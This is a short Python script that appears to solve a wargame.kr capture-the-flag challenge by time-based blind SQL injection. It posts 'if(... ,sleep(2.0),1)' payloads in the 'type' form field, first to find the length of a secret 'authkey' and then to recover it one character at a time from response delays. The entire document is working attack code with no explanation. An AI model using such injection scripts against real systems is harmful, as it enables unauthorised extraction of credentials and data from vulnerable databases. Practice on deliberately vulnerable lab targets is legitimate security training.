from requests import *
from time import *
s=session()
def name(leng):
    result=''
    for i in range(1,leng+1):
        for j in range(30,128):
            data={'mail':'1','cont':'1','type':f'if((select ascii(substr(authkey,{i},1)) from authkey)={j},sleep(2.0),1)'}
            url='http://wargame.kr:8080/qna/?page=to_jsmaster'
            start=time()
            response=post(url=url,data=data)
            end=time()
            if end-start > 2:
                result+=chr(j)
                continue
    print(result)

for i in range(50):
    data={'mail':'1','cont':'1','type':f'if((select length(authkey) from authkey)={i},sleep(2.0),1)'}
    url='http://wargame.kr:8080/qna/?page=to_jsmaster'
    start=time()
    response=post(url=url,data=data)
    end=time()
    if end-start > 2:
        print('flag_length:',i)
        name(i)
        break